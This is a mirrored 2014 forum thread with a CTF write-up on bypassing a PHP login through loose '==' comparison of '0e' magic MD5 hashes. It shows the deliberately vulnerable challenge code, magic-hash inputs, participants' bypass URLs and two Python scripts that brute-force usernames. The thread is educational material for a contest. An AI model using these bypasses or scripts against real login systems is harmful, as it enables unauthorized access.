<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">

<!-- Mirrored from garage4hackers.com/printthread.php?t=6153&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 13:40:31 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
	<base  /><!--[if IE]></base><![endif]-->
	<meta name="generator" content="vBulletin 4.2.1" />

	
	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
	



	<title> Writeup on Garage4Hackers Xmas / Dec Web Challenge 2014</title>
	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />

</head>
<body>

<div class="above_body">
<div id="header" class="floatcontainer">
<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
</div>
</div>
<div class="body_wrapper">
<div id="pagetitle">
	<h1><a href="showthreadfc2c.html?t=6153">Writeup on Garage4Hackers Xmas / Dec Web Challenge 2014</a></h1>
	<p class="description">Printable View</p>
</div>



<ul id="postlist">
	<li class="postbit blockbody" id="post_1">
	<div class="header">
		<div class="datetime">12-10-2014, 08:06 PM</div>
		<span class="username">[s]</span>
	</div>
	
	
		<div class="title">Writeup on Garage4Hackers Xmas / Dec Web Challenge 2014</div>
	
	<div class="content">
		<blockquote class="restore">Ho Ho Ho, Xmas challenge ended. This challenge was all about of bypassing login authentication. Obviously, it was funny challenge!! And the obvious reason was password md5 hash. A footnote was there in source code. <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">&lt;!-- <br />
&nbsp; &nbsp; We are so generous, see we provided you password hash to login :) 0e100132199235687421930375421091<br />
&nbsp; &nbsp; if(0e100132199235687421930375421091 == md5($_GET['pass']))<br />
&nbsp; &nbsp; {<br />
&nbsp; &nbsp; &nbsp; // Simple PHP CODE Logic <br />
&nbsp; &nbsp; }<br />
&nbsp; ?&gt; --&gt;</code><hr />
</div>Garage4Hackers Xmass Challenge is developed into PHP and it available to <a href="../external.html?link=https://dl.dropboxusercontent.com/u/18007092/G4HxMassEventChall.php" target="_blank">download</a> for learning purpose. <br />
<br />
Just a quick note: If you want to join G4H CTF team, then you PM me and checkout our last month <a href="../external.html?link=https://www.youtube.com/watch?v=Xoi5GxcD_Lg" target="_blank">Ranchoddas event</a> :) <br />
<br />
And I'm back to business, The main purpose of the CTF is to understand the PHP equal to (==) operator for comparing and even you can study <a href="../external.html?link=http://php.net/manual/en/function.strcmp.php" target="_blank">strcmp </a>function.  If a developer uses equal to (==) operator without measuring the risk, then it can be profitable for attacker. However, attack can be carried in rare cases only. we've received some expected result and some unexpected results but at the end both are results ;) <br />
<br />
There was 4k + unique Hits on the CTF page in 24 Hrs, only few submission we've valid received. <br />
<br />
Following is list of ninja, who solved the challenge in the time. <br />
 <br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">jinmo123&nbsp; - Good Solution but not expected<br />
tlk ( https://twitter.com/tlk___ ) - Nice Solution, but Not expected<br />
stypr (https://stypr.com) - W00tt , expected solution&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
Ajin Abraham - Nice Solution, but Not expected<br />
sagar popat&nbsp; - Nice Solution, but Not expected<br />
Sharath Unni - W00tt , expected solution</code><hr />
</div>There was three way to solve this CTF and expected way to solve the challenge is to bypass authentication by using PHP equal to (==) operator. Brute forcing username is second easy way to solve the challenge and last way was monkey testing. ( Just kidding ;) )<br />
<br />
<b>PHP CTF Code: </b><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">&lt;?php <br />
error_reporting(0);<br />
$a = htmlentities($_GET['username']);&nbsp; <br />
$c = htmlentities($_GET['password']);<br />
$b = md5($c);<br />
if (!empty($a) AND !empty($b)) { // empty function made this CTF more easy<br />
&nbsp;if (&quot;0e100132199235687421930375421091&quot; == $b) { // vulnerable line<br />
&nbsp; &nbsp; if ($b ===&quot;0e100132199235687421930375421091&quot;) {&nbsp; // To Avoiding some bugs and change behavior of CTF <br />
&nbsp; &nbsp;  if (&quot;133E-1337&quot; === $a) {// To Avoiding some bugs and change behavior of CTF <br />
&nbsp; &nbsp; &nbsp; &nbsp; print &quot;Flag : Garage4H4x0rFlagPhpFlag1337&quot;;&nbsp; &nbsp; <br />
&nbsp; &nbsp; &nbsp; }else{<br />
&nbsp; &nbsp; &nbsp; &nbsp; print &quot;umm!! nice try dude :), oops! you don't know username&quot;;<br />
&nbsp; &nbsp; &nbsp; }<br />
&nbsp; &nbsp; }else{<br />
&nbsp; &nbsp; &nbsp; if ($a ===&quot;0e100132199235687421930375421091&quot;) {// To Avoiding some bugs and change behavior of CTF <br />
&nbsp; &nbsp; &nbsp;  print &quot;umm!! nice try dude :), oops! &quot;;<br />
&nbsp; &nbsp; &nbsp; }else{<br />
&nbsp; &nbsp; &nbsp; &nbsp; if (&quot;133E-1337&quot; == $a) { // vulnerable line<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print &quot;Flag : Garage4H4x0rFlagPhpFlag1337&quot;;&nbsp; &nbsp; <br />
&nbsp; &nbsp; &nbsp; &nbsp; }else{<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Print &quot;Wrong Username&quot;;&nbsp; &nbsp; &nbsp; <br />
&nbsp; &nbsp; &nbsp; &nbsp; } <br />
&nbsp; &nbsp; }<br />
&nbsp; &nbsp; &nbsp; }&nbsp; <br />
&nbsp; }else{<br />
&nbsp; &nbsp; Print &quot;wrong&nbsp; Password&quot;;<br />
&nbsp; }&nbsp; <br />
}<br />
?&gt;</code><hr />
</div>Here is some story about PHP operator and expected Behavior of PHP equal to operator. <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">Input&nbsp; &nbsp; &nbsp;  | Output<br />
-------------------------<br />
&quot;0&quot; == &quot;0&quot; | True<br />
&quot;1&quot; == &quot;0&quot; | False <br />
-------------------------</code><hr />
</div><br />
Unexpected Behavior of PHP equal to operator. <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">Input&nbsp; &nbsp; &nbsp;  | Output<br />
-------------------------<br />
&quot;0e1&quot; == &quot;0&quot; | True<br />
-------------------------</code><hr />
</div>In detailed : <br />
<b>PHP consider it as scientific notation 0e1 = 0 * 10 ^ 1 and ANS is 0</b><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code"> &lt;?php <br />
&nbsp;  var_dump(&quot;0e1&quot; == 0);<br />
&nbsp;?&gt;</code><hr />
</div><div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">Finding entry points<br />
Branch analysis from position: 0<br />
Return found<br />
filename:&nbsp; &nbsp; &nbsp;  /in/Pvj4s<br />
function name:&nbsp; (null)<br />
number of ops:&nbsp; 4<br />
compiled vars:&nbsp; none<br />
line&nbsp; &nbsp;  # *&nbsp; op&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  fetch&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ext&nbsp; return&nbsp; operands<br />
---------------------------------------------------------------------------------<br />
&nbsp;  2&nbsp; &nbsp;  0&nbsp; &gt;&nbsp;  IS_EQUAL&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  ~0&nbsp; &nbsp; &nbsp; '0e1', 0<br />
&nbsp; &nbsp; &nbsp; &nbsp;  1&nbsp; &nbsp; &nbsp; SEND_VAL&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  ~0<br />
&nbsp; &nbsp; &nbsp; &nbsp;  2&nbsp; &nbsp; &nbsp; DO_FCALL&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'var_dump'<br />
&nbsp; &nbsp; &nbsp; &nbsp;  3&nbsp; &nbsp; &gt; RETURN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  1</code><hr />
</div>Here is the fun start, this is just plain text comparison and check out the following MD5 Hash, and most of developer use it as passwords. <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">var_dump(0e100132199235687421930375421091 == md5(urldecode('%02%a27%84')));<br />
&nbsp;bool(true) // w00t :)</code><hr />
</div>Another string : <div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">'\x98-\xde\x1f'</code><hr />
</div>    // Submission by Beched (@ahack_ru)<br />
<br />
try here : <a href="../external.html?link=http://3v4l.org/NK5hp" target="_blank">http://3v4l.org/NK5hp</a><br />
<br />
In our check was too simple to bypass, because we haven't put quotes around the hash. It made it to be integer, which causes expression to be true with any hash, which does not start with [1-9].<br />
<br />
Here is bypass if we use quote around hash: <br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">php &gt; var_dump('0e100132199235687421930375421091'==md5(&quot;\x0e\xd7\xb6\xea&quot;));&nbsp;  // Submission by Beched (@ahack_ru)<br />
bool(true)</code><hr />
</div>Try here : <a href="../external.html?link=http://3v4l.org/M9dpY" target="_blank">http://3v4l.org/M9dpY</a><br />
<br />
Here is another simple example, which can be found on the internet. <br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">http://3v4l.org/2vrMi</code><hr />
</div>While testing this CTF there is MD5 collision found by Sharath Unni <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">0e100132199235687421930375421091 (Found in HTML source code )<br />
0e104142395260374396839196939683 (MD5 collision )</code><hr />
</div>Both these hashes have the same plaintext equivalent: 26177715789 , you can decrypt MD5 here <div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code"> http://www.md5online.org/</code><hr />
</div> . <br />
<br />
This was all about PHP Equal operator, now what is solution of this CTF.<br />
<br />
Here is solution and you find many more ways: <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">http://162.208.48.16/?username=0e57640477961333848717747276704&amp;password=BRTKUJZ&amp;submit=Login&amp;debug=true<br />
http://162.208.48.16/?username=0e1&amp;password=NOOPCJF&amp;submit=Login&amp;debug=true<br />
http://162.208.48.16/?username=0e2&amp;password=26177715789&amp;submit=Login&amp;debug=true</code><hr />
</div><br />
<b>Submission by jinmo123  </b><br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">http://162.208.48.16/?username=000&amp;password=240610708&amp;submit=Login#</code><hr />
</div><b>Submission by tlk ( <a href="../external.html?link=https://twitter.com/tlk___" target="_blank">https://twitter.com/tlk___</a> ) </b><br />
<br />
Brute Force Script: <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">import requests<br />
s = requests.session()<br />
for i in range(255):<br />
&nbsp; &nbsp; r = s.get(&quot;http://162.208.48.16/?username=&quot;+chr(i)+&quot;&amp;password=QNKCDZO&amp;submit=Login&quot;)<br />
&nbsp; &nbsp; print len(r.content), chr(i), i, &quot;Wrong Username&quot; in r.content<br />
We can see that only #, &amp; and 0 not contains &quot;Wrong Username&quot;. let's try to prepend '0' :<br />
&nbsp; &nbsp; r = s.get(&quot;http://162.208.48.16/?username=0&quot;+chr(i)+&quot;&amp;password=QNKCDZO&amp;submit=Login&quot;)</code><hr />
</div><div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">http://162.208.48.16/?username=0.0&amp;password=QNKCDZO&amp;submit=Login</code><hr />
</div><b>Two Submission by stypr (<a href="../external.html?link=https://stypr.com/" target="_blank">https://stypr.com</a>) </b><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">http://162.208.48.16/?username=0e57640477961333848717747276704&amp;password=BRTKUJZ&amp;submit=Login&amp;debug=true<br />
http://162.208.48.16/?username=0x00&amp;password=BRTKUJZ&amp;submit=Login&amp;debug=true</code><hr />
</div><b>Submission by Ajin Abraham</b><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">import urllib2<br />
with open(&quot;10k most common.txt&quot;,&quot;r&quot;) as f:<br />
&nbsp; &nbsp; url='http://162.208.48.16/?username=[X]&amp;password=26177715789'<br />
&nbsp; &nbsp; no=0<br />
&nbsp; &nbsp; for line in f:<br />
&nbsp; &nbsp; &nbsp; &nbsp; turl=url.replace(&quot;[X]&quot;,line).replace(&quot;\n&quot;,&quot;&quot;).replace(&quot;\r&quot;,&quot;&quot;)<br />
&nbsp; &nbsp; &nbsp; &nbsp; response = urllib2.urlopen(turl)<br />
&nbsp; &nbsp; &nbsp; &nbsp; html = response.read()<br />
&nbsp; &nbsp; &nbsp; &nbsp; dat=html[:50]<br />
&nbsp; &nbsp; &nbsp; &nbsp; no+=1<br />
&nbsp; &nbsp; &nbsp; &nbsp; log= str(no)+&quot; Username: &quot;+ line +&quot;Response: &quot;+ dat<br />
&nbsp; &nbsp; &nbsp; &nbsp; if (&quot;Wrong&quot; in log):<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print no<br />
&nbsp; &nbsp; &nbsp; &nbsp; else:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print log<br />
response.close()</code><hr />
</div><div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">URL:http://162.208.48.16/?username=-0&amp;password=26177715789</code><hr />
</div><b>Submission by Sagar Popat</b><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">http://162.208.48.16/?username=00&amp;password=26177715789&amp;submit=Login</code><hr />
</div><br />
<b>Submission by Sharath Unni </b><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">http://162.208.48.16/?username=0e12323&amp;password=26177715789&amp;submit=Login</code><hr />
</div>Thats all for today :) Thank you for reading .</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_2">
	<div class="header">
		<div class="datetime">12-11-2014, 03:29 AM</div>
		<span class="username">sh3llc0d3r</span>
	</div>
	
	
	<div class="content">
		<blockquote class="restore">thanks for this .. we learn lot <br />
looking forward more .... so we can learn :p</blockquote>
	</div>
</li>
</ul>


</div>
<div class="below_body">
<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">04:24 PM</span>.</div>

<div id="footer_copyright" class="footer_copyright">
	<!-- Do not remove this copyright notice -->
	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
	<!-- Do not remove this copyright notice -->	
</div>
<div id="footer_morecopyright" class="footer_morecopyright">
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	Copyright 2010 - 2017, Garage4Hackers
</div>
 
</div>

<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}</script>
</body>

<!-- Mirrored from garage4hackers.com/printthread.php?t=6153&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 13:40:31 GMT -->
</html>